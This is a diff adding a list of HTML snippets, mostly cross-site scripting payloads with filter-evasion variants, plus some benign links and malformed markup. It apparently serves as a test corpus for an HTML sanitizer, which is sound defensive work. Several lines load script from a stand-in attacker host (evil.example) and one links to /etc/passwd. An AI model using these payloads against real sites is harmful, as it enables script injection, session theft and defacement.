@@ -1,0 +1,184 @@
+<script>alert(1)</script>
+<SCRIPT SRC=http://evil.example/xss.js></SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+<script/src=//evil.example/x.js>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<<script>alert(1);//<</script>
+<script>/*</script><script>*/alert(1)</script>
+<img src=x onerror=alert(1)>
+<IMG SRC=x ONERROR=alert(1)>
+<img src="x" onerror="alert(1)">
+<img/src=x/onerror=alert(1)>
+<img src=`x`onerror=alert(1)>
+<img src=javascript:alert(1)>
+<img src="jav&#x61;script:alert(1)">
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<IMG SRC=# onmouseover="alert('xxs')">
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<SVG ONLOAD=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><a xlink:href="javascript:alert(1)"><text x=20 y=20>XSS</text></a></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set attributeName=onmouseover to=alert(1)>
+<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></foreignObject></svg>
+<iframe src="javascript:alert(1)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src=//evil.example></iframe>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<a href="javascript:alert(1)">x</a>
+<a href="JaVaScRiPt:alert(1)">x</a>
+<a href="jav&#x09;ascript:alert(1)">x</a>
+<a href="jav&#x0A;ascript:alert(1)">x</a>
+<a href="jav&#x0D;ascript:alert(1)">x</a>
+<a href="jav	ascript:alert(1)">x</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29">x</a>
+<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert(1)">x</a>
+<a href=" javascript:alert(1)">x</a>
+<a href="  &#14;  javascript:alert(1)">x</a>
+<a href="javascript&colon;alert(1)">x</a>
+<a href="javascript&#58;alert(1)">x</a>
+<a href="\x01javascript:alert(1)">x</a>
+<a href=javascript:alert(1)>x</a>
+<a href='javascript:alert(1)'>x</a>
+<a href="vbscript:msgbox(1)">x</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<a href="data:text/html,<script>alert(1)</script>">x</a>
+<a href="file:///etc/passwd">x</a>
+<a href="//evil.example/x">x</a>
+<a href="javascript://%0aalert(1)">x</a>
+<a href="https://ok.example" onclick="alert(1)">x</a>
+<a href="https://ok.example" onmouseover=alert(1)>x</a>
+<a href="https://ok.example" style="x:expression(alert(1))">x</a>
+<a href="https://ok.example" target="_blank">x</a>
+<a href="https://ok.example"onfocus=alert(1) autofocus>x</a>
+<a href=x onclick=alert(1)//>x</a>
+<a href="x" id=x name=x class=x>x</a>
+<a href="mailto:a@b.example?subject=x">x</a>
+<style>body{background:url("javascript:alert(1)")}</style>
+<style>@import 'javascript:alert(1)';</style>
+<style>*{x:expression(alert(1))}</style>
+<div style="width:expression(alert(1))">x</div>
+<div style="background:url(javascript:alert(1))">x</div>
+<p style="behavior:url(xss.htc)">x</p>
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</UL>
+<link rel=stylesheet href="javascript:alert(1)">
+<link rel=stylesheet href=//evil.example/x.css>
+<base href="javascript:alert(1)//">
+<base href="//evil.example/"><a href="x">x</a>
+<form action="javascript:alert(1)"><input type=submit></form>
+<form action=//evil.example><input name=x value=y><button>go</button></form>
+<form><button formaction="javascript:alert(1)">x</button></form>
+<input autofocus onfocus=alert(1)>
+<input type=image src=x onerror=alert(1)>
+<textarea autofocus onfocus=alert(1)></textarea>
+<select autofocus onfocus=alert(1)>
+<button onclick=alert(1)>x</button>
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv=refresh content="0; url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<meta http-equiv="set-cookie" content="x=y">
+<object data="javascript:alert(1)"></object>
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<object type=text/x-scriptlet data=//evil.example/x.html></object>
+<embed src="javascript:alert(1)">
+<embed src=//evil.example/x.swf type=application/x-shockwave-flash>
+<applet code=x.class></applet>
+<details open ontoggle=alert(1)>
+<details/open/ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<body onload=alert(1)>
+<body background="javascript:alert(1)">
+<marquee onstart=alert(1)>x</marquee>
+<div onmouseover="alert(1)">hover</div>
+<div onpointerenter=alert(1)>x</div>
+<p onclick=alert(1)>x</p>
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+<math><maction actiontype=statusline#http://x xlink:href="javascript:alert(1)">x</maction></math>
+<math><style><img src=x onerror=alert(1)></style></math>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+<table><td background="javascript:alert(1)">x</td></table>
+<select><template><style><img src=x onerror=alert(1)></style></template></select>
+<template><script>alert(1)</script></template>
+<xmp><p title="</xmp><img src=x onerror=alert(1)>">
+<listing><img src=x onerror=alert(1)></listing>
+<plaintext><img src=x onerror=alert(1)>
+<noembed><img src=x onerror=alert(1)></noembed>
+<title><img src=x onerror=alert(1)></title>
+<textarea><img src=x onerror=alert(1)></textarea>
+<p><b><i>x</b></i><script>alert(1)</script>
+<p<script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)
+<img src="x onerror=alert(1)
+<a href="javascript:alert(1)
+<script>alert(1)
+<div><p><strong><em>unclosed
+</p></div></strong></em>
+<p></p></p></p></p>
+<!--><script>alert(1)</script>-->
+<!-- --><script>alert(1)</script><!-- -->
+<!--[if gte IE 4]><script>alert(1)</script><![endif]-->
+<!--<img src="--><img src=x onerror=alert(1)//">
+<!-- x --!><img src=x onerror=alert(1)>
+<![CDATA[<script>alert(1)</script>]]>
+<?xml version="1.0"?><script>alert(1)</script>
+<?php echo 1; ?><img src=x onerror=alert(1)>
+<!DOCTYPE html><script>alert(1)</script>
+<%00script>alert(1)</%00script>
+<scr&#x00;ipt>alert(1)</scr&#x00;ipt>
+<img src=x o&#x6e;error=alert(1)>
+<img src=x &#111;nerror=alert(1)>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;img src=x onerror=alert(1)&#x3E;
+<p>javascript:alert(1)</p>
+<p>texto com onerror=alert(1) e style=color:red no meio</p>
+<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
+<pre><script>alert(1)</script></pre>
+<blockquote cite="javascript:alert(1)">x</blockquote>
+<q cite="javascript:alert(1)">x</q>
+<h3 onclick=alert(1)>x</h3>
+<ul onmouseover=alert(1)><li onclick=alert(1)>x</li></ul>
+<strong style="x:y" class="z" id="w">x</strong>
+<font face="x" onclick=alert(1)>x</font>
+<center><img src=x onerror=alert(1)></center>
+<span data-x="1" onclick=alert(1)>x</span>
+<keygen autofocus onfocus=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<bgsound src="javascript:alert(1)">
+<layer src="javascript:alert(1)"></layer>
+<frameset><frame src="javascript:alert(1)"></frameset>
+<portal src=//evil.example></portal>
+<canvas onclick=alert(1)></canvas>
+<image src=x onerror=alert(1)>
+<img src=x:alert(alt) onerror=eval(src) alt=0>
+<a href="https://ok.example/?q=<script>alert(1)</script>">x</a>
+<a href="https://ok.example/&quot;onmouseover=&quot;alert(1)">x</a>
+<a href="https://ok.example" rel="opener" target="_blank">x</a>
+<a href="  https://ok.example  ">x</a>
+<a href="HTTPS://OK.EXAMPLE">x</a>
+<a href="mailto:x@y.example"onclick=alert(1)>x</a>
+<a href="ftp://ok.example/x">x</a>
+<a href="tel:+5511999999999">x</a>
+<a href="about:blank">x</a>
+<a href="blob:https://ok.example/x">x</a>
+<a href="ws://ok.example">x</a>
+<a href="&#x6a;avascript:alert(1)">x</a>
+<a href="jaVa&Tab;Script:alert(1)">x</a>
+<a href="jav&NewLine;ascript:alert(1)">x</a>
+<a href="java&#10;script:alert(1)">x</a>
+<a href="&#x20;javascript:alert(1)">x</a>
+<a href="javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>">x</a>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+javascript:alert(1)//
+</script><script>alert(1)</script>
+</a><img src=x onerror=alert(1)>
